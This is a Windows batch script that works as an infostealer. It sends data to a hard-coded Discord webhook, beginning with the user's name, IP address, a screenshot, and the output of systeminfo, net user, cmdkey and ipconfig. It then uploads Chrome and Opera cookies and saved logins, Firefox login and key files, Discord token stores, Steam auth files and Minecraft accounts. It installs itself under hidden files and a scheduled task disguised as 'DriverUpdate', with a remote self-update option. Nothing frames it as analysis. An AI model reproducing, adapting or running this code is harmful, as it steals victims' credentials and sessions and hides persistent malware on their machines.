@echo off
set "vpath=C:\Users\Public\Documents"
cd %vpath%
set "webhook=https://discord.com/api/webhooks/962420744342634537/dtCZ9p4YlIB8jVYKWOw3La0ugweIgZgm4CLFZDzbtrt30XQ1SFnFDDf2MzHH_MmyPEBp"
for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (
set HH24=%%a
set MI=%%b
)
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %NetworkIP%]\nLocal time: %HH24%:%MI%```\"}"  %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Screenshot @ %HH24%:%MI%```\"}"  %webhook%
set "ssurl=https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true"
IF EXIST "s.exe" GOTO waitloop3
curl --silent -L --fail "%ssurl%" -o s.exe
>NUL attrib "%vpath%\s.exe" +h
:waitloop3
IF EXIST "s.exe" GOTO waitloopend3
timeout /t 5 /nobreak > NUL
:waitloopend3
2> NUL s.exe -wh 1e9060a -o s.png
curl --silent --output /dev/null -F ss=@"%vpath%\s.png" %webhook%
2>NUL del "%vpath%\s.png"
set "tempsys=%appdata%\sysinfo.txt"
2>NUL SystemInfo > "%tempsys%"
curl --silent --output /dev/null -F systeminfo=@"%tempsys%" %webhook%
del "%tempsys%" >nul 2>&1
set "netuser=%appdata%\netuser.txt"
2>NUL net user > "%netuser%"
curl --silent --output /dev/null -F tasks=@"%netuser%" %webhook%
del "%netuser%" >nul 2>&1
set "cmdkey=%appdata%\cmdkey.txt"
2>NUL cmdkey /list > "%cmdkey%"
curl --silent --output /dev/null -F tasks=@"%cmdkey%" %webhook%
del "%cmdkey%" >nul 2>&1
set "ipconfig=%appdata%\ipconfig.txt"
2>NUL ipconfig /all > "%ipconfig%"
curl --silent --output /dev/null -F tasks=@"%ipconfig%" %webhook%
del "%ipconfig%" >nul 2>&1
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- CHROME -```\"}"  %webhook%
curl --silent --output /dev/null -F c=@"%localappdata%\Google\Chrome\User Data\Default\Cookies" %webhook%
curl --silent --output /dev/null -F h=@"%localappdata%\Google\Chrome\User Data\Default\History" %webhook%
timeout /t 2 /nobreak > NUL
curl --silent --output /dev/null -F s=@"%localappdata%\Google\Chrome\User Data\Default\Shortcuts" %webhook%
curl --silent --output /dev/null -F b=@"%localappdata%\Google\Chrome\User Data\Default\Bookmarks" %webhook%
curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Default\Login Data" %webhook%
timeout /t 2 /nobreak > NUL
curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Local State" %webhook%
timeout /t 2 /nobreak > NUL
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- OPERA -```\"}"  %webhook%
curl --silent --output /dev/null -F c=@"%appdata%\Opera Software\Opera Stable\Cookies" %webhook%
curl --silent --output /dev/null -F h=@"%appdata%\Opera Software\Opera Stable\History" %webhook%
timeout /t 2 /nobreak > NUL
curl --silent --output /dev/null -F s=@"%appdata%\Opera Software\Opera Stable\Shortcuts" %webhook%
curl --silent --output /dev/null -F b=@"%appdata%\Opera Software\Opera Stable\Bookmarks" %webhook%
curl --silent --output /dev/null -F l=@"%appdata%\Opera Software\Opera Stable\Login Data" %webhook%
timeout /t 2 /nobreak > NUL
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- FIREFOX -```\"}"  %webhook%
for /f %%f in ('2^>NUL dir /b "%appdata%\Mozilla\Firefox\Profiles"') do (
curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\logins.json" %webhook%
timeout /t 2 /nobreak > NUL
curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\key3.db" %webhook%
curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\key4.db" %webhook%
curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\cookies.sqlite" %webhook%
timeout /t 2 /nobreak > NUL
)
)
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- DISCORD -```\"}"  %webhook%
for /f %%f in ('2^>NUL dir /b "%appdata%\discord\Local Storage\leveldb\"') do (
echo %%f|find ".ldb"
if errorlevel 1 (@echo off) else (
curl --silent --output /dev/null -F level=@"%appdata%\discord\Local Storage\leveldb\%%f" %webhook%
timeout /t 2 /nobreak > NUL
)
)
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- STEAM -```\"}"  %webhook%
curl --silent --output /dev/null -F steamusers=@"C:\Program Files (x86)\Steam\config\loginusers.vdf" %webhook%
curl --silent --output /dev/null -F loginusers=@"C:\Program Files\Steam\config\loginusers.vdf" %webhook%
for /f %%s in ('2^>NUL dir /b "C:\Program Files (x86)\Steam\"') do (
echo %%s|find "ssfn"
if errorlevel 1 (@echo off) else (
curl --silent --output /dev/null -F auth=@"C:\Program Files (x86)\Steam\%%s" %webhook%
timeout /t 2 /nobreak > NUL
)
)
for /f %%s in ('2^>NUL dir /b "C:\Program Files\Steam\"') do (
echo %%s|find "ssfn"
if errorlevel 1 (@echo off) else (
curl --silent --output /dev/null -F auth=@"C:\Program Files\Steam\%%s" %webhook%
timeout /t 2 /nobreak > NUL
)
)
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- MINECRAFT -```\"}"  %webhook%
curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_profiles.json" %webhook%
curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_accounts.json" %webhook%
timeout /t 2 /nobreak > NUL
set "recurring=false"
>NUL attrib -h "%vpath%\%uname%"
>NUL attrib -h "%vpath%\%bname%"
>NUL attrib -h "%vpath%\%vname%"
set "when=Onidle /i 60"
set "ScheduleName=DriverUpdate"
set "bname=0.bat"
set "uname=1.bat"
set "vname=0.vbs"
set "updateurl="
set "targetusername="
del /ah "%vpath%\%uname%" >nul 2>&1
del /ah "%vpath%\%vname%" >nul 2>&1
if not "%~dp0"=="%vpath%\" (
  del /ah "%vpath%\%bname%" >nul 2>&1
  >NUL copy "%~f0" "%vpath%\%bname%"
)
if "%updateurl%"=="" (
:normalrecurring
echo set WshShell = wscript.createobject^("WScript.shell"^)> "%vpath%\%vname%"
echo WshShell.run """%vpath%\%bname%"" ", 0, true>> "%vpath%\%vname%"
echo set WshShell = Nothing>> "%vpath%\%vname%"
goto skipupdateconfig
) else ( goto recurringupdate )
goto dontremoveme
:recurringupdate
if "%targetusername%"=="" (
goto nontargetedupdate 
) else ( goto targetedupdate )
goto dontremoveme2
:nontargetedupdate
IF EXIST "%vpath%\temp.txt" del "%vpath%\temp.txt" >nul 2>&1
:: Change VBS
echo set WshShell = wscript^.createobject^("WScript.shell"^)> "%vpath%\%vname%"
echo WshShell^.run """%vpath%\%uname%"" ", 0, true>> "%vpath%\%vname%"
echo set WshShell = Nothing>> "%vpath%\%vname%"
:: Make updater batch
echo ^@echo off> "%vpath%\%uname%"
echo cd "%vpath%">> "%vpath%\%uname%"
echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
echo ^>NUL attrib -h %bname%>> "%vpath%\%uname%"
echo ^>NUL attrib -h %uname%>> "%vpath%\%uname%"
echo ^>NUL attrib -h %vname%>> "%vpath%\%uname%"
echo curl --silent --output /dev/null -sb --trace-ascii "Accept: text/plain" %updateurl% ^> "%vpath%\temp.txt">> "%vpath%\%uname%"
echo :wl>> "%vpath%\%uname%"
echo IF EXIST "%vpath%\temp.txt" GOTO w2>> "%vpath%\%uname%"
echo timeout /t 1 >> "%vpath%\%uname%"
echo goto wl>> "%vpath%\%uname%"
echo :w2>> "%vpath%\%uname%"
echo 2^>NUL del %bname%>> "%vpath%\%uname%"
echo ren temp.txt %bname%>> "%vpath%\%uname%"
echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
echo break^>%vname%>> "%vpath%\%uname%"
echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo echo WshShell^.run """%vpath%\%bname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo start %vname%>> "%vpath%\%uname%"
echo timeout 1 ^>nul>> "%vpath%\%uname%"
echo break^>%vname%>> "%vpath%\%uname%"
echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo echo WshShell^.run """%vpath%\%uname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo ^>NUL attrib "%vpath%\%vname%" +h>> "%vpath%\%uname%"
echo ^>NUL attrib "%vpath%\%bname%" +h>> "%vpath%\%uname%"
echo ^>NUL attrib "%vpath%\%uname%" +h>> "%vpath%\%uname%"
goto skipupdateconfig
:dontremoveme2
goto dontremoveme3
:targetedupdate
IF "%USERNAME%"=="%targetusername%" (
IF EXIST "%vpath%\temp.txt" 2>NUL del "%vpath%\temp.txt"
:: Change VBS
echo set WshShell = wscript^.createobject^("WScript.shell"^)> "%vpath%\%vname%"
echo WshShell^.run """%vpath%\%uname%"" ", 0, true>> "%vpath%\%vname%"
echo set WshShell = Nothing>> "%vpath%\%vname%"
:: Make updater batch
echo ^@echo off> "%vpath%\%uname%"
echo cd "%vpath%">> "%vpath%\%uname%"
echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
echo ^>NUL attrib -h %bname%>> "%vpath%\%uname%"
echo ^>NUL attrib -h %uname%>> "%vpath%\%uname%"
echo ^>NUL attrib -h %vname%>> "%vpath%\%uname%"
echo curl --silent --output /dev/null -sb --trace-ascii "Accept: text/plain" %updateurl% ^> "%vpath%\temp.txt">> "%vpath%\%uname%"
echo :wl>> "%vpath%\%uname%"
echo IF EXIST "%vpath%\temp.txt" GOTO w2>> "%vpath%\%uname%"
echo timeout /t 1 >> "%vpath%\%uname%"
echo goto wl>> "%vpath%\%uname%"
echo :w2>> "%vpath%\%uname%"
echo 2^>NUL del %bname%>> "%vpath%\%uname%"
echo ren temp.txt %bname%>> "%vpath%\%uname%"
echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
echo break^>%vname%>> "%vpath%\%uname%"
echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo echo WshShell^.run """%vpath%\%bname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo start %vname%>> "%vpath%\%uname%"
echo timeout 1 ^>nul>> "%vpath%\%uname%"
echo break^>%vname%>> "%vpath%\%uname%"
echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo echo WshShell^.run """%vpath%\%uname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
echo ^>NUL attrib "%vpath%\%vname%" +h>> "%vpath%\%uname%"
echo ^>NUL attrib "%vpath%\%bname%" +h>> "%vpath%\%uname%"
echo ^>NUL attrib "%vpath%\%uname%" +h>> "%vpath%\%uname%"
goto skipupdateconfig
) else ( goto normalrecurring )
:dontremoveme3
:dontremoveme
:skipupdateconfig
>NUL SchTasks /create /f /sc %when% /tn "%ScheduleName%" /tr "%vpath%\%vname%"
if errorlevel 0 (set "recurring=true, %when%") else (set "recurring=failed, %when%, is probably incorrect.")
>NUL attrib "%vpath%\%vname%" +h
>NUL attrib "%vpath%\%bname%" +h
>NUL attrib "%vpath%\%uname%" +h
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Batch Scheduled: %recurring%\n[End of report]```\"}"  %webhook%
exit
0.bat
12 KB
